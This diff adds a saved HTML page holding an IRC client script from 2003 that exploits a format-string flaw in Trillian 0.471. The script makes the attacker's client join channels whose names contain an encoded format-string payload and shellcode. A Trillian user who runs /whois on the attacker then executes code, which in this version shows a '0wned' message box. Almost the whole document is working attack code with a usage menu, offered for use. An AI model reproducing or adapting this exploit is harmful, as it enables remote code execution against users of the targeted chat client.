@@ -1,0 +1,88 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<!-- saved from url=(0047)http://xor.nopninjas.com/trillian-whoisexp1.irc -->
+<HTML><HEAD>
+<META content="text/html; charset=iso-8859-1" http-equiv=Content-Type>
+<META content="MSHTML 5.00.3502.5390" name=GENERATOR></HEAD>
+<BODY><XMP>###########################################################################
+# trillian-whoisexp1.irc - http://www.nopninjas.com - 2003.5.14 - v1
+#
+#   sloth (sloth@nopninjas.com) - vuln and exploit
+#      strlen (alex@strlen.net) - irc script
+# zen-parse (zen-parse@gmx.net) - various other trillian holes ;)
+#
+# strlen (russian hacker)
+#  Shout outs to: Bubb Rubb, Lil Sis
+#  Also shout outs to: Turkey, and best of all, the Trillian Team
+#
+# sloth (honorary russian for drinking so much)
+#  0dd, pulltheplug
+#
+##########################################################################
+#
+# The trillian user must /whois your irc client to exploit them
+# You must run this script before joining other channels or you
+# can modify the script to count the characters in your whois 
+# string before the exploit channels.
+#
+
+echo ***
+echo *** trillian-whoisexp.irc loaded ***
+echo *** Type /shellcode to see how to use this
+echo ***
+echo *** There are no bugs in trillian, I tell you, NEVER
+echo *** Those are lies of WESTERN INFIDELS
+echo ***
+
+alias shellcode {
+  @arg =  0
+
+  fec ($*) argu {
+    @arg++
+  }
+
+  if (arg < 3) {
+    echo ***
+    echo *** - shellcode
+    echo ***   1 - MessageBoxA "0wned"
+    echo ***
+    echo *** - target
+    echo ***   1 - Trillian 0.471
+    echo ***
+    echo *** Usage: /shellcode <shellcode> <target>
+    echo ***
+  }
+
+  {
+    switch ($0) {
+      (1) {
+        switch ($1) {
+          (1) { 
+                assign tv $chr(249)$chr(35)$chr(67)$chr(1)
+                assign tve $chr(166)$chr(159)$chr(65)%c
+                
+          }
+          (*) { 
+                echo *** 
+                echo *** invalid target for select shellcode
+                echo ***
+          }
+        }
+        assign sc $chr(64)$chr(64)$chr(235)$chr(25)$chr(94)$chr(51)$chr(201)$chr(137)$chr(78)$chr(5)$chr(184)$tv$chr(45)$chr(1)$chr(1)$chr(1)$chr(1)$chr(139)$chr(24)$chr(106)$chr(16)$chr(86)$chr(86)$chr(81)$chr(255)$chr(211)$chr(232)$chr(226)$chr(255)$chr(255)$chr(255)0wned$chr(255)      
+      }
+      (*) {
+        echo ***
+        echo *** invalid shellcode
+        echo ***
+      }
+    }
+
+    assign exploit %08x%08x%08x%08x%08x%08x%08x%08x%4030d$tve$chr(235)$chr(25)%c%cXXXX$chr(100)$chr(22)$chr(66)%c$chr(100)$chr(22)$chr(66)%c$chr(100)$chr(22)$chr(66)%c$chr(100)$chr(22)$chr(66)%c
+
+    partall
+    join #$sc
+    join #$exploit
+
+  }
+
+}
+</XMP></BODY></HTML>
